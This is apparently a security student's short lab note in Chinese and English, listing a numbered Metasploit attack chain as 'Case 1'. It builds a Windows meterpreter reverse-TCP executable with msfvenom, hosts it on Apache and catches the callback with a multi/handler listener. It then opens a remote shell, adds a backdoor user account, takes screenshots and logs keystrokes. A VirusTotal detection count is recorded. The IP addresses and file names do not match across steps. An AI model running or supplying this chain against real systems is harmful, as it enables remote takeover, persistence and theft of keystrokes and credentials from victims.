#### Jimmy是教我資安的教授，我用他的名字來命名病毒
#### (我真的很感謝他帶我踏入資安)

#### [Case 1: (55) Detected on virustotal] only msfvenom
    1_[kali]#> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.246 LPORT=8888 -f exe > /var/www/html/jimmy1.exe
    2_[kali]#> service apache2 start
    3_[kali]#> msfconsole
    4_[kali]msf> use exploit/multi/handler
    5_[kali]msf> set payload windows/meterpreter/reverse_tcp
    6_[kali]msf> set lhost 10.0.0.43
    7_[kali]msf> set lport 8888
    8_[kali]msf> run
    9_[windows] http://10.0.0.43/virus1.exe
    10_[windows]execute virus1.exe
    11_[kali]meterpreter > shell  
    12_net user /add jimmy 123456
    13_[kali]meterpreter > screenshot 
    14_[kali]meterpreter > keyscan_start
    15_[kali]meterpreter > keyscan_dump
    16_[kali]meterpreter > keyscan_stop

